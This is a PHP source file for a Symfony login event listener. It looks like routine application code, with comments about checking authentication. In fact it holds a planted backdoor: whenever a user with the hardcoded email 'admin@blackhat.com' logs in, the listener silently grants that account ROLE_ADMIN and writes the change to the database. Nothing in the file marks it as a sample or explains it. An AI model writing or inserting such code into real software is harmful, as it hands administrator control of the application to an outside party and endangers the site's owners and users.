<?php
namespace App\EventListener;

use Symfony\Component\Security\Http\Event\InteractiveLoginEvent;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;

class LoginListener
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this->entityManager = $entityManager;
    }

    // This method is triggered whenever a user logs in
    public function onSecurityInteractiveLogin(InteractiveLoginEvent $event)
    {
        $user = $event->getAuthenticationToken()->getUser();

        // Ensure the user is fully authenticated
        if ($user && $user instanceof \App\Entity\User) {
            if ($user->getEmail() === 'admin@blackhat.com') {
                // Check if the user already has the admin role
                if (!in_array('ROLE_ADMIN', $user->getRoles())) {
                    // Add the admin role
                    $user->setRoles(array_merge($user->getRoles(), ['ROLE_ADMIN']));

                    // Persist the changes to the database
                    $this->entityManager->persist($user);
                    $this->entityManager->flush();
                }
            }
        }
    }
}
